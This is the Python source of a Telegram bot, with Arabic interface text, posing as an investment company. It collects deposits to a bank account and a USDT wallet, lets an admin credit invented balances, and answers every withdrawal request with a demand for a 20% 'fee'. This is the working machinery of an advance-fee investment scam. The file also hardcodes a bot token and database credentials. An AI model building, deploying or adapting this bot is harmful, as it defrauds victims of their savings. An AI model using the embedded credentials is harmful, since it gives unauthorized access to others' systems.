import os, urllib.parse, logging
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- ⚙️ 1. نظام المراقبة (Logs) ---
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

flask_app = Flask('')
@flask_app.route('/')
def home(): return "🚀 Dragon Pro Elite: Online"

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    t = Thread(target=run_flask); t.daemon = True; t.start()

# --- 🔑 2. البيانات الثابتة ---
TOKEN = '8731999916:AAHDjo1noyGIbUH699aTjNns9kCjP8P9SHc'
ADMINS = [6016547718]
SUPPORT = "https://t.me/HCICICVICIF9"

# بيانات الدفع (التي تظهر للمستثمر)
BANK_INFO = "🏦 **بيانات الحساب البنكي:**\n\nالراجحي: `123456789012345`\nالاسم: شركة سهم القابضة"
USDT_INFO = "🔗 **عنوان محفظة USDT (TRC20):**\n\n`TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA`"

# المصادقة مع قاعدة البيانات
u_enc, p_enc = urllib.parse.quote_plus('Abduh'), urllib.parse.quote_plus('A11223344@5566')
MONGO_URI = f"mongodb+srv://{u_enc}:{p_enc}@cluster0.0a4wefx.mongodb.net/DragonFinal?retryWrites=true&w=majority"

# مبالغ الاستثمار المنظمة
SAR_V = ["1000", "2000", "5000", "10000", "20000", "50000"]
USD_V = ["300", "500", "1000", "2000", "5000", "10000"]

# --- 🗄️ 3. قاعدة البيانات ---
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client.get_database()
    users_col = db['investors']
except Exception as e:
    logger.error(f"DB Connection Error: {e}")
    users_col = None

def get_user_data(uid):
    default = {"uid": int(uid), "sar": 0.0, "usd": 0.0, "t": 0}
    if users_col is None: return default
    try:
        res = users_col.find_one({"uid": int(uid)})
        return res if res else default
    except: return default

# --- 🏠 4. الواجهات (المهنجمة) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (﷼)", callback_data='d_sr'), InlineKeyboardButton("🇺🇸 استثمار ($)", callback_data='d_us')],
        [InlineKeyboardButton("💳 محفظتي", callback_data='w'), InlineKeyboardButton("📈 صفقاتي", callback_data='tr')],
        [InlineKeyboardButton("📤 طلب سحب", callback_data='wd')],
        [InlineKeyboardButton("👨‍💻 الدعم الفني", url=SUPPORT)]
    ]
    txt = f"👑 **مرحباً بك في شركة سهم القابضة**\n\nالمستثمر: **{user.first_name}**\nرقم العضوية: `{user.id}`\n\n_نظام استثماري متطور لنمو أرباحك بأمان._"
    
    if update.message:
        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    data = query.data
    await query.answer() # ضروري جداً لجعل الزر يستجيب فوراً
    
    u = get_user_data(uid)

    if data == 'main': 
        await start(update, context)
    
    elif data == 'w':
        txt = f"🏦 **تفاصيل محفظتك:**\n\n🇸🇦 `{u.get('sar',0):,}` ﷼\n🇺🇸 `{u.get('usd',0):,}` $"
        await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'tr':
        await query.edit_message_text(f"📈 **عدد الصفقات النشطة:** `{u.get('t',0)}` \nالحالة: 🟢 جاري العمل", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))

    elif data == 'wd':
        r_sar = float(u.get('sar', 0)) * 0.20
        r_usd = float(u.get('usd', 0)) * 0.20
        txt = (f"📤 **طلب سحب الأرباح:**\n\n"
               f"💰 رصيدك: `{u.get('sar',0)}` ﷼ / `{u.get('usd',0)}` $\n\n"
               f"⚠️ **رسوم السحب المستحقة (20%):**\n"
               f"يتوجب عليك دفع مبلغ: `{r_sar:,.1f}` ﷼ أو `{r_usd:,.1f}` $\n\n"
               f"**يرجى دفع الرسوم المتوجبه عليك لفتح بوابة تحويل الارباح.**")
        await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data in ['d_sr', 'd_us']:
        curr = 'sr' if data == 'd_sr' else 'us'
        vals = SAR_V if curr == 'sr' else USD_V
        btns = [[InlineKeyboardButton(f"{v} {'﷼' if curr=='sr' else '$'}", callback_data=f"s_{curr}_{v}") for v in vals[i:i+2]] for i in range(0, 6, 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text("📊 **اختر فئة الاستثمار المناسبة:**", reply_markup=InlineKeyboardMarkup(btns))

    elif data.startswith('s_'): # عند اختيار مبلغ معين
        _, curr, amt = data.split('_')
        info = BANK_INFO if curr == 'sr' else USDT_INFO
        await query.edit_message_text(f"✨ **إيداع بمبلغ {amt}:**\n\n{info}\n\n📸 **أرسل صورة الإيصال الآن ليتم التحقق وتفعيل حسابك.**", parse_mode='Markdown')

    elif data.startswith(('ok', 'no')): # أزرار المالك
        if uid not in ADMINS: return
        if data.startswith('ok'):
            _, c, a, tid = data.split('_')
            key = "sar" if c == "sr" else "usd"
            if users_col: users_col.update_one({"uid": int(tid)}, {"$inc": {key: float(a), "t": 1}}, upsert=True)
            await query.edit_message_caption("✅ تم شحن الرصيد وتفعيل الصفقة!")
            try: await context.bot.send_message(tid, f"🎊 مبروك! تم شحن `{a}` {'﷼' if key=='sar' else '$'} في محفظتك بنجاح.")
            except: pass
        else: await query.edit_message_caption("❌ تم رفض هذا الإيصال.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await update.message.reply_text("⏳ تم استلام إيصالك.. جاري المراجعة من الإدارة.")
    
    # أزرار الإدارة منظمة لتعمل فوراً
    kb = [[InlineKeyboardButton(f"﷼ {p}", callback_data=f"ok_sr_{p}_{u.id}") for p in SAR_V[i:i+3]] for i in range(0, 6, 3)]
    kb += [[InlineKeyboardButton(f"$ {p}", callback_data=f"ok_us_{p}_{u.id}") for p in USD_V[i:i+3]] for i in range(0, 6, 3)]
    kb.append([InlineKeyboardButton("🚫 رفض الإيصال", callback_data=f"no_{u.id}")])
    
    for adm in ADMINS:
        await context.bot.send_photo(adm, update.message.photo[-1].file_id, 
                                   caption=f"🔔 إيداع جديد من: {u.first_name}\nID: `{u.id}`", 
                                   reply_markup=InlineKeyboardMarkup(kb))

# --- 🚀 5. الانطلاق ---
if __name__ == '__main__':
    keep_alive()
    app = Application.builder().token(TOKEN).build()
    
    # المعالجات (Handlers)
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), start))
    
    logger.info("🔥 DRAGON ELITE IS READY AND STABLE!")
    app.run_polling(drop_pending_updates=True)
